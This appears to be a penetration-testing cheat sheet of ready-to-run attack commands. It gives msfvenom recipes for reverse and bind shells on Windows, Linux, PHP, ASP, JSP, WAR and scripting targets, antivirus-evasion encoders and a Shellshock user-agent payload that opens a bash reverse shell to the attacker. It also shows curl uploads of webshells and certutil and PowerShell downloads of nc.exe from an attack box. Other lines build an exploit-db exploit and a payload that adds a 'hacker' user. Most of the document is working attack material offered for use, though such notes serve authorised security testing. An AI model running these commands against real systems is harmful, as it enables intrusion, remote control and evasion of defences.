### :panda_face: msfvenom: Linux Binary
```
msfvenom -a x86 -f elf -p linux/x86/exec CMD=/bin/sh prepend setuid=true > binaryname
```


### :panda_face: msfvenom : one line commands
```
msfvenom -l payloads | grep "cmd/unix"|awk '{print $1}'
msfvenom -l payloads | grep "cmd/windows"|awk '{print $1}'
msfvenom -l payloads | grep "cmd/java"|awk '{print $1}'
```


* * *
### :panda_face: shellshock via burp - blind injection

```
user agent: () { :; }; bash -i >& /dev/tcp/IPADDRESSMINE/4040 0>&1
```

### :panda_face: google: firefart dirty cow




* * *
### :panda_face: payloads - general
* * *

- List: 
```bash
msfvenom -l payloads
```
- Options:
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp --list-options
```

* * *
### :panda_face: creating & sending
* * *
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=myIP LPORT=4040 -f aspx > exploit.aspx

curl -X PUT http://targetIP/exploit.txt --data-binary @exploit.aspx
curl -X MOVE -H 'Destination: https://targetIP/exploit.aspx' https://targetIP/exploit.txt

- msfconsole
	- use exploit/multi/handler
	- set lhost myIP
	- set lport 4040
	- run
	
- run multi/recon/local_exploit_suggester
```

* * *
### :panda_face: other
* * *
```bash
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=myIP LPORT=4040 -e x86/shikata_ga_nai –f exe –o exploit.exe

### Example Buffer Overflow Creation
msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python


msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=4444 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python

#### shellscript create payload
#!/bin/bash

read -p "RHOST: " RHOST
read -p "LHOST: " LHOST
read -p "LPORT: " LPORT

msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp RHOST=$RHOST LHOST=$LHOST LPORT=$LPORT exitfunc=thread -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python

```

### :panda_face: uploading exploits using curl
```bash
curl -X PUT http://targetIP/exploit.txt --data-binary @exploit.aspx
curl -X MOVE -H 'Destination: https://targetIP/exploit.aspx' https://targetIP/exploit.txt
 ```

### :panda_face: using curl to exploit
* * *
```bash
- curl -X POST http://URL/example.php

- curl post request with data:

	- curl -d "data=example1&data2=example2" http://URL/example.cgi

- curl POST to a form:

	- curl -X POST -F "name=user" -F "password=test" http://URL/example.php

- curl POST with a file:

	- curl -X POST -F "image=@/path/example.gif" http://URL/uploadform.cgi

```
* * *
### :panda_face: python http/ftp server
* * *
```python
python -m SimpleHTTPServer 80 [Optional: port]
python -m SimpleHTTPServer 8000
python3 -m http.server 80
python3 -m http.server 8000

python -m pyftpdlib -p 21
python3 -m pyftpdlib -p 21

```

* * *
### :panda_face: Windows exploit builds
* * *
```bash
apt-get update
apt-get install mingw-w64
wget -O 40564.c https://www.exploit-db.com/download/40564
i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32
```

* * *
### :panda_face: Windows grabbing exploits
* * *
```
certutil -urlcache -split -f [URL] [Filename.Extension]
```
	-URLcache: Displays or deletes URL cache entries.
	-f: Forces fetching a specific URL and updating the cache.
	-split: Split embedded ASN.1 elements, and save to files on disk.

Using powershell
```
powershell Import-Module BitsTransfer;Start-BitsTransfer -Source http://[IP Attack box]/nc.exe -Destination C:\
## powershell version 3 - 
powershell $PSVersionTable.PSVersion
powershell Invoke-WebRequest -Uri http://[IP Attack box]/nc.exe -OutFile C:\nc.exe

```


```
echo $storageDir = $pwd > httpdownload.ps1

echo $webclient = New-Object System.Net.WebClient >> httpdownload.ps1

echo $webclient.DownloadFile("[Download URL]","[File Name]") >> httpdownload.ps1
```
execute
```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File httpdownload.ps1
```




* * *
### :panda_face: Windows Payloads
* * *
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe	

msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe	

msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe	

msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe	

msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
```

* * *
### :panda_face: Linux Payloads
* * *
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf	

msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf	

msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf	

msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf

Add a user in windows with msfvenom: 

msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
```

* * *
### :panda_face: Web Payloads
* * *
```bash

## PHP

msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

## ASP

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp

## JSP

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp

## WAR

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war

```

* * *
### :panda_face: Scripting Payloads
* * *
```bash

## Python

msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py

## Bash

msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh

## Perl

msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl


## Creating an Msfvenom Payload with an encoder while removing bad charecters:

msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x0A\x0D"

```



* * *
### :panda_face: links
* * *
- https://github.com/hackerhouse-opensource/backdoors
- https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/


* * *
```note
In Linux, and other UNIX-like systems, you have to be root (have superuser privileges) in order to listen to TCP or UDP ports below 1024.
```
